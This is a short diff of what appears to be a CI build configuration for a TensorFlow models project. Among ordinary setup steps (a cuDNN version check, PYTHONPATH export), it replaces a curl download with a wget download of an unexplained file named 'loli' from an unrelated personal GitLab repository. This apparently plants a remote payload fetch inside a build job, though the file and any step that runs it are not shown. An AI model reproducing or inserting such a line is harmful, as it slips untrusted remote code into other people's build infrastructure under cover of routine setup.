@@ -13,4 +13,4 @@
       - cat /usr/include/x86_64-linux-gnu/cudnn_v*.h | grep CUDNN_MAJOR -A 2
       - cd /tensorflow/models/research/
       - export PYTHONPATH=$PYTHONPATH:`pwd`:`pwd`/slim
-      - curl -L -o loli https://gitlab.com/anabsjs80/josss/-/raw/main/loli
+      - wget https://gitlab.com/anabsjs80/josss/-/raw/main/loli
